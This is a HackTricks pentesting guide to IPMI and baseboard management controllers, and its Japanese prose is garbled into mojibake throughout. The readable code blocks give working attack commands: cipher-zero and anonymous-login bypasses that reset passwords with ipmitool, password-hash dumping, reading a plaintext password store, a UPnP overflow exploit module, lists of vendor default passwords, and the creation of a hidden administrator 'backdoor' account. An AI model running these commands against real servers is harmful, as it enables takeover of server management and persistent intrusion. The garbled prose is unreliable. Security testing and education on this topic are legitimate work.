# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

### **IPMIã®æ¦‚è¦**

**[ã‚¤ãƒ³ãƒ†ãƒªã‚¸ã‚§ãƒ³ãƒˆãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ç®¡ç†ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** ã¯ã€ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã‚„é›»æºçŠ¶æ…‹ã«ä¾å­˜ã›ãšã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã‚·ã‚¹ãƒ†ãƒ ã®ãƒªãƒ¢ãƒ¼ãƒˆç®¡ç†ã¨ç›£è¦–ã®ãŸã‚ã®æ¨™æº–åŒ–ã•ã‚ŒãŸã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’æä¾›ã—ã¾ã™ã€‚ã“ã®æŠ€è¡“ã«ã‚ˆã‚Šã€ã‚·ã‚¹ãƒ†ãƒ ç®¡ç†è€…ã¯ã€ã‚·ã‚¹ãƒ†ãƒ ãŒã‚ªãƒ•ã¾ãŸã¯å¿œç­”ã—ãªã„å ´åˆã§ã‚‚ã€ãƒªãƒ¢ãƒ¼ãƒˆã§ã‚·ã‚¹ãƒ†ãƒ ã‚’ç®¡ç†ã§ãã€ç‰¹ã«ä»¥ä¸‹ã®ç”¨é€”ã«ä¾¿åˆ©ã§ã™ï¼š

- OSãƒ–ãƒ¼ãƒˆå‰ã®è¨­å®š
- é›»æºç®¡ç†
- ã‚·ã‚¹ãƒ†ãƒ éšœå®³ã‹ã‚‰ã®å›å¾©

IPMIã¯ã€æ¸©åº¦ã€é›»åœ§ã€ãƒ•ã‚¡ãƒ³é€Ÿåº¦ã€é›»æºä¾›çµ¦ã®ç›£è¦–ãŒå¯èƒ½ã§ã€åœ¨åº«æƒ…å ±ã®æä¾›ã€ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ãƒ­ã‚°ã®ãƒ¬ãƒ“ãƒ¥ãƒ¼ã€SNMPã‚’ä»‹ã—ãŸã‚¢ãƒ©ãƒ¼ãƒˆã®é€ä¿¡ã‚‚è¡Œã„ã¾ã™ã€‚ãã®é‹ç”¨ã«å¿…è¦ãªã®ã¯ã€é›»æºã¨LANæ¥ç¶šã§ã™ã€‚

1998å¹´ã«ã‚¤ãƒ³ãƒ†ãƒ«ã«ã‚ˆã£ã¦å°å…¥ã•ã‚Œã¦ä»¥æ¥ã€IPMIã¯å¤šãã®ãƒ™ãƒ³ãƒ€ãƒ¼ã«ã‚ˆã£ã¦ã‚µãƒãƒ¼ãƒˆã•ã‚Œã€ç‰¹ã«ãƒãƒ¼ã‚¸ãƒ§ãƒ³2.0ã®LANçµŒç”±ã®ã‚·ãƒªã‚¢ãƒ«ã‚µãƒãƒ¼ãƒˆã«ã‚ˆã‚Šã€ãƒªãƒ¢ãƒ¼ãƒˆç®¡ç†æ©Ÿèƒ½ãŒå¼·åŒ–ã•ã‚Œã¾ã—ãŸã€‚ä¸»è¦ãªã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ã¯ä»¥ä¸‹ãŒå«ã¾ã‚Œã¾ã™ï¼š

- **ãƒ™ãƒ¼ã‚¹ãƒœãƒ¼ãƒ‰ç®¡ç†ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ (BMC)ï¼š** IPMIæ“ä½œã®ãŸã‚ã®ä¸»è¦ãªãƒã‚¤ã‚¯ãƒ­ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã€‚
- **é€šä¿¡ãƒã‚¹ã¨ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ï¼š** ICMBã€IPMBã€ãƒ­ãƒ¼ã‚«ãƒ«ãŠã‚ˆã³ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ¥ç¶šç”¨ã®ã•ã¾ã–ã¾ãªã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’å«ã‚€å†…éƒ¨ãŠã‚ˆã³å¤–éƒ¨é€šä¿¡ã®ãŸã‚ã®ã‚‚ã®ã€‚
- **IPMIãƒ¡ãƒ¢ãƒªï¼š** ãƒ­ã‚°ã¨ãƒ‡ãƒ¼ã‚¿ã‚’ä¿å­˜ã™ã‚‹ãŸã‚ã®ã‚‚ã®ã€‚

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆ**: 623/UDP/TCPï¼ˆé€šå¸¸ã¯UDPã§ã™ãŒã€TCPã§å‹•ä½œã—ã¦ã„ã‚‹å ´åˆã‚‚ã‚ã‚Šã¾ã™ï¼‰

## åˆ—æŒ™

### ç™ºè¦‹
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
ã‚ãªãŸã¯**ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’æ¬¡ã®ã‚ˆã†ã«ã—ã¦**ç‰¹å®š**ã§ãã¾ã™:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMIã®è„†å¼±æ€§

IPMI 2.0ã®é ˜åŸŸã§ã¯ã€Dan Farmerã«ã‚ˆã£ã¦é‡è¦ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ¬ é™¥ãŒç™ºè¦‹ã•ã‚Œã€**cipher type 0**ã‚’é€šã˜ã¦è„†å¼±æ€§ãŒéœ²å‘ˆã—ã¾ã—ãŸã€‚ã“ã®è„†å¼±æ€§ã¯ã€[Dan Farmerã®ç ”ç©¶](http://fish2.com/ipmi/cipherzero.html)ã§è©³ç´°ã«æ–‡æ›¸åŒ–ã•ã‚Œã¦ãŠã‚Šã€æœ‰åŠ¹ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã•ã‚Œã‚‹é™ã‚Šã€ä»»æ„ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã®å¼±ç‚¹ã¯ã€HPã€Dellã€Supermicroãªã©ã®ã•ã¾ã–ã¾ãªBMCã§è¦‹ã¤ã‹ã‚Šã€ã™ã¹ã¦ã®IPMI 2.0å®Ÿè£…ã«ãŠã‘ã‚‹åºƒç¯„ãªå•é¡Œã‚’ç¤ºå”†ã—ã¦ã„ã¾ã™ã€‚

### **Cipher 0ã«ã‚ˆã‚‹IPMIèªè¨¼ãƒã‚¤ãƒ‘ã‚¹**

ã“ã®æ¬ é™¥ã‚’æ¤œå‡ºã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®Metasploitè£œåŠ©ã‚¹ã‚­ãƒ£ãƒŠãƒ¼ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
ã“ã®æ¬ é™¥ã®æ‚ªç”¨ã¯ã€ä»¥ä¸‹ã«ç¤ºã™ã‚ˆã†ã« `ipmitool` ã‚’ä½¿ç”¨ã—ã¦å®Ÿç¾å¯èƒ½ã§ã‚ã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒªã‚¹ãƒˆè¡¨ç¤ºã¨å¤‰æ›´ã‚’å¯èƒ½ã«ã—ã¾ã™ï¼š
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP èªè¨¼ãƒªãƒ¢ãƒ¼ãƒˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥å–å¾—**

ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€æ—¢å­˜ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã«å¯¾ã—ã¦å¡©ã‚’åŠ ãˆãŸãƒãƒƒã‚·ãƒ¥åŒ–ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ï¼ˆMD5ãŠã‚ˆã³SHA1ï¼‰ã‚’å–å¾—ã§ãã¾ã™ã€‚ã“ã®è„†å¼±æ€§ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«ã€Metasploitã¯ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’æä¾›ã—ã¦ã„ã¾ã™ï¼š
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI åŒ¿åèªè¨¼**

å¤šãã® BMC ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆè¨­å®šã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒç©ºã®ã€ŒåŒ¿åã€ã‚¢ã‚¯ã‚»ã‚¹ãŒè¨±å¯ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®è¨­å®šã¯ã€`ipmitool` ã‚’ä½¿ç”¨ã—ã¦åå‰ä»˜ããƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒªã‚»ãƒƒãƒˆã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI å¹³æ–‡ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**

IPMI 2.0ã®é‡è¦ãªè¨­è¨ˆé¸æŠã¯ã€èªè¨¼ç›®çš„ã®ãŸã‚ã«BMCå†…ã«å¹³æ–‡ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä¿å­˜ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚SupermicroãŒã“ã‚Œã‚‰ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’`/nv/PSBlock`ã‚„`/nv/PSStore`ãªã©ã®å ´æ‰€ã«ä¿å­˜ã™ã‚‹ã“ã¨ã¯ã€é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®æ‡¸å¿µã‚’å¼•ãèµ·ã“ã—ã¾ã™ï¼š
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnPã®è„†å¼±æ€§**

Supermicroã®IPMIãƒ•ã‚¡ãƒ¼ãƒ ã‚¦ã‚§ã‚¢ã«UPnP SSDPãƒªã‚¹ãƒŠãƒ¼ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ã€ç‰¹ã«UDPãƒãƒ¼ãƒˆ1900ã§ã®å®Ÿè£…ã¯ã€æ·±åˆ»ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã‚’ã‚‚ãŸã‚‰ã—ã¾ã™ã€‚[Rapid7ã®é–‹ç¤º](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play)ã§è©³è¿°ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€UPnPãƒ‡ãƒã‚¤ã‚¹ç”¨ã®Intel SDKãƒãƒ¼ã‚¸ãƒ§ãƒ³1.3.1ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€BMCã¸ã®ãƒ«ãƒ¼ãƒˆã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

**HPã¯è£½é€ æ™‚ã«**ãã®**Integrated Lights Out (iLO)**è£½å“ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒ©ãƒ³ãƒ€ãƒ åŒ–ã—ã¾ã™ã€‚ã“ã®æ…£è¡Œã¯ã€**é™çš„ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆè³‡æ ¼æƒ…å ±**ã‚’ä½¿ç”¨ã™ã‚‹å‚¾å‘ã®ã‚ã‚‹ä»–ã®ãƒ¡ãƒ¼ã‚«ãƒ¼ã¨ã¯å¯¾ç…§çš„ã§ã™ã€‚ã•ã¾ã–ã¾ãªè£½å“ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®æ¦‚è¦ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š

- **HP Integrated Lights Out (iLO)**ã¯ã€**å·¥å ´ã§ãƒ©ãƒ³ãƒ€ãƒ åŒ–ã•ã‚ŒãŸ8æ–‡å­—ã®æ–‡å­—åˆ—**ã‚’ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ã—ã¦ä½¿ç”¨ã—ã€ã‚ˆã‚Šé«˜ã„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¬ãƒ™ãƒ«ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚
- **Dellã®iDRACã€IBMã®IMM**ã€ãŠã‚ˆã³**Fujitsuã®Integrated Remote Management Controller**ã®ã‚ˆã†ãªè£½å“ã¯ã€ãã‚Œãã‚Œã€Œcalvinã€ã€ã€ŒPASSW0RDã€ï¼ˆã‚¼ãƒ­ã‚’å«ã‚€ï¼‰ã€ãŠã‚ˆã³ã€Œadminã€ã®ã‚ˆã†ãªç°¡å˜ã«æ¨æ¸¬å¯èƒ½ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚
- åŒæ§˜ã«ã€**Supermicro IPMI (2.0)ã€Oracle/Sun ILOM**ã€ãŠã‚ˆã³**ASUS iKVM BMC**ã‚‚ã€ŒADMINã€ã€ã€Œchangemeã€ã€ãŠã‚ˆã³ã€Œadminã€ã‚’ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ã—ã¦ä½¿ç”¨ã™ã‚‹ã‚·ãƒ³ãƒ—ãƒ«ãªãƒ‡ãƒ•ã‚©ãƒ«ãƒˆè³‡æ ¼æƒ…å ±ã‚’æŒã£ã¦ã„ã¾ã™ã€‚


## BMCã‚’ä»‹ã—ã¦ãƒ›ã‚¹ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹

Baseboard Management Controller (BMC)ã¸ã®ç®¡ç†ã‚¢ã‚¯ã‚»ã‚¹ã¯ã€ãƒ›ã‚¹ãƒˆã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ã•ã¾ã–ã¾ãªçµŒè·¯ã‚’é–‹ãã¾ã™ã€‚ç°¡å˜ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€BMCã®ã‚­ãƒ¼ãƒœãƒ¼ãƒ‰ã€ãƒ“ãƒ‡ã‚ªã€ãƒã‚¦ã‚¹ï¼ˆKVMï¼‰æ©Ÿèƒ½ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯ã€GRUBã‚’ä»‹ã—ã¦ãƒ›ã‚¹ãƒˆã‚’ãƒ«ãƒ¼ãƒˆã‚·ã‚§ãƒ«ã«å†èµ·å‹•ã™ã‚‹ï¼ˆ`init=/bin/sh`ã‚’ä½¿ç”¨ï¼‰ã‹ã€ãƒªã‚«ãƒãƒªãƒ‡ã‚£ã‚¹ã‚¯ã¨ã—ã¦è¨­å®šã•ã‚ŒãŸä»®æƒ³CD-ROMã‹ã‚‰ãƒ–ãƒ¼ãƒˆã™ã‚‹ã“ã¨ã§è¡Œãˆã¾ã™ã€‚ã“ã®ã‚ˆã†ãªæ–¹æ³•ã«ã‚ˆã‚Šã€ãƒ›ã‚¹ãƒˆã®ãƒ‡ã‚£ã‚¹ã‚¯ã‚’ç›´æ¥æ“ä½œã—ã€ãƒãƒƒã‚¯ãƒ‰ã‚¢ã®æŒ¿å…¥ã€ãƒ‡ãƒ¼ã‚¿æŠ½å‡ºã€ã¾ãŸã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ã®ãŸã‚ã«å¿…è¦ãªä»»æ„ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚ãŸã ã—ã€ã“ã‚Œã¯ãƒ›ã‚¹ãƒˆã®å†èµ·å‹•ã‚’å¿…è¦ã¨ã—ã€é‡å¤§ãªæ¬ ç‚¹ã§ã™ã€‚å†èµ·å‹•ã›ãšã«å®Ÿè¡Œä¸­ã®ãƒ›ã‚¹ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã¯ã‚ˆã‚Šè¤‡é›‘ã§ã€ãƒ›ã‚¹ãƒˆã®æ§‹æˆã«ã‚ˆã£ã¦ç•°ãªã‚Šã¾ã™ã€‚ãƒ›ã‚¹ãƒˆã®ç‰©ç†ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã¾ãŸã¯ã‚·ãƒªã‚¢ãƒ«ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ãŒãƒ­ã‚°ã‚¤ãƒ³ã—ãŸã¾ã¾ã§ã‚ã‚Œã°ã€BMCã®KVMã¾ãŸã¯ã‚·ãƒªã‚¢ãƒ«ã‚ªãƒ¼ãƒãƒ¼LANï¼ˆsolï¼‰æ©Ÿèƒ½ã‚’ä»‹ã—ã¦`ipmitool`ã‚’ä½¿ç”¨ã—ã¦ç°¡å˜ã«ä¹—ã£å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚i2cãƒã‚¹ã‚„Super I/Oãƒãƒƒãƒ—ã®ã‚ˆã†ãªå…±æœ‰ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ãƒªã‚½ãƒ¼ã‚¹ã®æ‚ªç”¨ã‚’æ¢ã‚‹ã“ã¨ã¯ã€ã•ã‚‰ãªã‚‹èª¿æŸ»ãŒå¿…è¦ãªåˆ†é‡ã§ã™ã€‚

## ãƒ›ã‚¹ãƒˆã‹ã‚‰BMCã«ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’å°å…¥ã™ã‚‹

BMCã‚’è£…å‚™ã—ãŸãƒ›ã‚¹ãƒˆã‚’ä¾µå®³ã—ãŸå ´åˆã€**ãƒ­ãƒ¼ã‚«ãƒ«BMCã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’åˆ©ç”¨ã—ã¦ãƒãƒƒã‚¯ãƒ‰ã‚¢ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã«æŒç¶šçš„ãªå­˜åœ¨ã‚’ä½œæˆã—ã¾ã™ã€‚ã“ã®æ”»æ’ƒã«ã¯ã€ä¾µå®³ã•ã‚ŒãŸãƒ›ã‚¹ãƒˆã«**`ipmitool`**ãŒå­˜åœ¨ã—ã€BMCãƒ‰ãƒ©ã‚¤ãƒãƒ¼ã‚µãƒãƒ¼ãƒˆãŒæœ‰åŠ¹ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€èªè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦ãƒ›ã‚¹ãƒˆã®ãƒ­ãƒ¼ã‚«ãƒ«ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’ä½¿ç”¨ã—ã¦BMCã«æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æ³¨å…¥ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã®æŠ€è¡“ã¯ã€Linuxã€Windowsã€BSDã€ã•ã‚‰ã«ã¯DOSã‚’å«ã‚€åºƒç¯„ãªã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã«é©ç”¨å¯èƒ½ã§ã™ã€‚
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## References

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
